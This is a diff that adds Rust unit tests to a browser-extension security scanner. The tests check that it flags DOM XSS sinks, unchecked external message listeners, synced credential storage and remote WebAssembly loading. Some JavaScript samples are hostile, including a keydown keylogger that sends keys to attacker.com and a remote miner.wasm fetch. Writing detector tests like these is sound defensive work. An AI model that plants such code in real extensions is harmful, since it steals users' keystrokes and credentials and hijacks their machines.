@@ -78,3 +78,78 @@ fn test_html_csp_violations_detection() {
     let event_handlers: Vec<_> = violations.iter().filter(|v| v.kind == "Inline Event Handler").collect();
     assert_eq!(event_handlers.len(), 2);
 }
+
+#[test]
+fn test_dom_xss_detection() {
+    let js = r#"
+        const payload = location.hash.substring(1);
+        document.getElementById('output').innerHTML = payload;
+        document.write("<b>Dangerous</b>");
+    "#;
+    let report = crx_gate::ast::analyze_js_content("popup.js", js);
+    assert_eq!(report.dom_xss_findings.len(), 2);
+    assert!(report.dom_xss_findings.iter().any(|f| f.kind.contains("innerHTML")));
+    assert!(report.dom_xss_findings.iter().any(|f| f.kind.contains("document.write")));
+}
+
+#[test]
+fn test_insecure_external_message_detection() {
+    // 1. Insecure listener without sender check
+    let insecure_js = r#"
+        chrome.runtime.onMessageExternal.addListener((request, sender, sendResponse) => {
+            console.log("Received command:", request.action);
+            sendResponse({ status: "done" });
+        });
+    "#;
+    let report1 = crx_gate::ast::analyze_js_content("background.js", insecure_js);
+    assert_eq!(report1.insecure_external_msg_findings.len(), 1);
+
+    // 2. Safe listener that checks sender.origin
+    let safe_js = r#"
+        chrome.runtime.onMessageExternal.addListener((request, sender, sendResponse) => {
+            if (sender.origin !== "https://trusted-portal.company.com") {
+                return;
+            }
+            sendResponse({ ok: true });
+        });
+    "#;
+    let report2 = crx_gate::ast::analyze_js_content("background.js", safe_js);
+    assert_eq!(report2.insecure_external_msg_findings.len(), 0, "Safe listener checking origin should not be flagged");
+}
+
+#[test]
+fn test_keylogger_and_password_snooping_detection() {
+    let js = r#"
+        window.addEventListener("keydown", (e) => {
+            fetch("https://attacker.com/keys?k=" + e.key);
+        });
+        const pwField = document.querySelector("input[type='password']");
+    "#;
+    let report = crx_gate::ast::analyze_js_content("content.js", js);
+    assert_eq!(report.keylogger_findings.len(), 2);
+    assert!(report.keylogger_findings.iter().any(|f| f.trigger.contains("keydown")));
+    assert!(report.keylogger_findings.iter().any(|f| f.trigger.contains("Password")));
+}
+
+#[test]
+fn test_storage_sync_credentials_detection() {
+    let js = r#"
+        chrome.storage.sync.set({
+            auth_token: "secret_12345",
+            user_theme: "dark"
+        });
+    "#;
+    let report = crx_gate::ast::analyze_js_content("background.js", js);
+    assert_eq!(report.storage_sync_findings.len(), 1);
+    assert_eq!(report.storage_sync_findings[0].key_name, "auth_token");
+}
+
+#[test]
+fn test_remote_wasm_detection() {
+    let js = r#"
+        WebAssembly.instantiateStreaming(fetch("https://cdn.malicious-modules.com/miner.wasm"));
+    "#;
+    let report = crx_gate::ast::analyze_js_content("worker.js", js);
+    assert_eq!(report.remote_wasm_findings.len(), 1);
+    assert!(report.remote_wasm_findings[0].api_name.contains("instantiateStreaming"));
+}
